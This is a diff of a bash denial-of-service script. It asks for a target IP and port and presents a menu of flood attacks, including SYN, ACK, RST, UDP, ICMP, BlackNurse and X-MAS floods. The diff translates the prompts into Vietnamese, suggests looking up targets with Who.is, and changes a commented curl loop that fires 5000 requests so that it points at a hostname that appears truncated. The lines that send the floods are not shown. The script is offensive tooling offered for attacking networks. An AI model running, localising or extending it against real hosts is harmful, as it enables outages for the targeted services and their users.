@@ -12,20 +12,20 @@ echo ""
 IP=$1
 if [ "$IP" == "" ]
  then
-        echo "Enter Target IP as an Argument"
+        echo "NHAP IP, su dung Who.is de track IP"
         exit
 fi
 
 PORT=$2
 if [ "$PORT" == "" ]
  then
-        echo "Enter Target PORT as an Argument"
+        echo "Nhap PORT (80 hoac 443)"
         exit
 fi
 
 echo "Target: $IP:$PORT"
 echo ""
-ATTACK='Please chose your attack: '
+ATTACK='Chon phuong thuc tan cong: '
 options=("SYN-Flood" "PUSH-Flood" "Push/Ack-Flood" "Push/Ack-Flood-with-Timestamp" "SYN/ACK-Flood" "SYN/ACK-Flood-with-Timestamp" "ACK-Flood" "ACK-Flood-with-Timestamp" "ACK-Flood-single_source" "RST-Flood" "FIN-Flood" "UDP-Flood" "UDP-Flood-volumetric" "UDP-Flood-fragmented" "ICMP-Flood" "ICMP-Flood-volumetric" "BlackNurse1" "BlackNurse2" "BlackNurse3" "BlackNurse4" "X-MAS-Flood" "Y-MAS-Flood" "Quit")
 
 select opt in "${options[@]}"
@@ -147,4 +147,4 @@ do
         *) echo invalid option;;
     esac
 done
-# for i in {1..5000}; do curl -v --header "Host: whatever" http://10.128.10.80/whatever$i; done
+# for i in {1..5000}; do curl -v --header "Host: whatever" http://yami-sora./whatever$i; done
